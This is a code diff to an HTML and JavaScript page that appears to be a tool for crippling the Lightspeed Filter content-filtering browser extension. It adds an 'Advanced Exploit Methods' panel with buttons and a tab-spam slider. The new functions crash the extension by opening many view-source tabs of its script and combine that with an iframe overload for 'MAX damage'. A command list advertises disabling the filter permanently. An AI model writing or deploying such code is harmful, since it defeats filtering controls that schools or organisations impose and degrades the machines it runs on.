@@ -427,46 +427,104 @@
         }
 
         .cmd-history {
-    position: fixed;
-    bottom: 70px; /* Adjust based on command box height */
-    right: 20px;
-    background: #1e1f22;
-    padding: 10px;
-    border-radius: 8px;
-    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-    color: white;
-    max-height: 200px;
-    overflow-y: auto; /* Enable scrolling */
-    width: 300px;
-    display: none; /* Hidden by default */
-    font-family: "Roboto", sans-serif;
-    font-size: 14px;
-    line-height: 1.5;
-}
+            position: fixed;
+            bottom: 70px; /* Adjust based on command box height */
+            right: 20px;
+            background: #1e1f22;
+            padding: 10px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            color: white;
+            max-height: 200px;
+            overflow-y: auto; /* Enable scrolling */
+            width: 300px;
+            display: none; /* Hidden by default */
+            font-family: "Roboto", sans-serif;
+            font-size: 14px;
+            line-height: 1.5;
+        }
 
-.cmd-history.show {
-    display: block; /* Show when needed */
-}
+        .cmd-history.show {
+            display: block; /* Show when needed */
+        }
 
-/* Hide scrollbar but keep functionality */
-.cmd-history::-webkit-scrollbar {
-    width: 0; /* Hide scrollbar for Chrome, Safari, and Opera */
-}
+        /* Hide scrollbar but keep functionality */
+        .cmd-history::-webkit-scrollbar {
+            width: 0; /* Hide scrollbar for Chrome, Safari, and Opera */
+        }
 
-.cmd-history {
-    scrollbar-width: none; /* Hide scrollbar for Firefox */
-    -ms-overflow-style: none; /* Hide scrollbar for IE and Edge */
-}
+        .cmd-history {
+            scrollbar-width: none; /* Hide scrollbar for Firefox */
+            -ms-overflow-style: none; /* Hide scrollbar for IE and Edge */
+        }
 
-/* Style for individual history items */
-.cmd-history div {
-    padding: 5px;
-    border-bottom: 1px solid #444; /* Add a subtle separator */
-}
+        /* Style for individual history items */
+        .cmd-history div {
+            padding: 5px;
+            border-bottom: 1px solid #444; /* Add a subtle separator */
+        }
 
-.cmd-history div:last-child {
-    border-bottom: none; /* Remove separator for the last item */
-}
+        .cmd-history div:last-child {
+            border-bottom: none; /* Remove separator for the last item */
+        }
+
+        /* Exploit buttons styling */
+        .exploit-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .exploit-buttons button {
+            background: #ff5555;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            flex-grow: 1;
+            text-align: center;
+            min-width: 120px;
+        }
+        
+        .exploit-buttons button:hover {
+            background: #ff3333;
+        }
+        
+        .exploit-buttons button.nuke {
+            background: #ff0000;
+            font-weight: bold;
+        }
+        
+        .exploit-buttons button.nuke:hover {
+            background: #cc0000;
+        }
+        
+        /* Tab slider styling */
+        .tab-slider {
+            margin: 15px 0;
+            padding: 10px;
+            background: #292a2d;
+            border-radius: 8px;
+        }
+        
+        .tab-slider label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        
+        .tab-slider input[type="range"] {
+            width: 100%;
+        }
+        
+        .tab-slider .value-display {
+            text-align: center;
+            margin-top: 5px;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -493,14 +551,35 @@
         <div id="printer-tab">
             <h3 style="user-select: none; font-weight: 400;"></h3>
             <div id="div-container"></div>
+            
+            <!-- New Exploit Buttons Section -->
+            <div style="margin-top: 30px;">
+                <h3>Advanced Exploit Methods</h3>
+                <div class="exploit-buttons">
+                    <button onclick="disableLightspeedFilter()">Disable (Iframes)</button>
+                    <button onclick="crashLightspeed()">Crash (Source Spam)</button>
+                    <button class="nuke" onclick="nukeLightspeed()">NUKE BOTH</button>
+                </div>
+            </div>
         </div>
+        
         <div id="settings-tab" style="display: none;">
             <h2 style="user-select: none;">Settings</h2>
             <label for="show-all-extensions" style="display: none;"></label>
             <input id="show-all-extensions" style="display: none;">
-            <label for="iframe-count">Amount of iframes</label>
-            <input type="range" min="100" max="100000000000000000" value="75000" step="100" id="iframe-count">
-            <span id="iframe-count-display">75000</span>
+            
+            <div class="tab-slider">
+                <label for="iframe-count">Iframe Count:</label>
+                <input type="range" min="100" max="100000" value="75000" step="100" id="iframe-count">
+                <div class="value-display" id="iframe-count-display">75000</div>
+            </div>
+            
+            <div class="tab-slider">
+                <label for="tab-count">Tab Spam Intensity:</label>
+                <input type="range" min="1" max="20" value="5" id="tab-count">
+                <div class="value-display" id="tab-count-display">5</div>
+            </div>
+            
             <div style="border-top: 1px solid #444; margin-bottom: 10px; margin-top: 20px; padding-top: 10px; width: 100%;"></div>
         </div>
     
@@ -553,6 +632,10 @@ document.getElementById("show-all-extensions").addEventListener("change", functi
 
 document.addEventListener('DOMContentLoaded', function() {
     document.querySelector("div.option").classList.add("selected");
+});
+
+document.getElementById('tab-count').addEventListener('input', (e) => {
+    document.getElementById('tab-count-display').textContent = e.target.value;
 });
 
 document.querySelectorAll(".option").forEach(option => {
@@ -945,6 +1028,32 @@ const allCommands = [
     "disablelightspeedfilter - Disable Lightspeed Filter permanently (UNLIMITED POWER)",
     "disablelightspeed mix - Mix both extensions in each tab (UNLIMITED POWER)",
 ];
+
+function crashLightspeed() {
+    const extensionUrl = "view-source:chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem///main.js";
+    const tabsCount = document.getElementById('tab-count').value || 5; // Get slider value
+    const windows = [];
+
+    // Open initial tabs
+    for (let i = 0; i < tabsCount; i++) {
+        const win = window.open(extensionUrl, `lsf_${i}`);
+        if (win) windows.push(win);
+    }
+
+    // Auto-close after 30 seconds
+    setTimeout(() => {
+        windows.forEach(win => {
+            if (win && !win.closed) win.close();
+        });
+        alert("Lightspeed Filter crashed (tabs closed).");
+    }, 30000);
+}
+
+function nukeLightspeed() {
+    disableLightspeedFilter(); // Trigger iframe overload
+    setTimeout(crashLightspeed, 2000); // Trigger source spam after 2 sec
+    alert("NUKE INITIATED: Combining iframes + source spam for MAX damage!");
+}
 
 // Function to toggle the command box visibility
 function toggleCmdBox() {
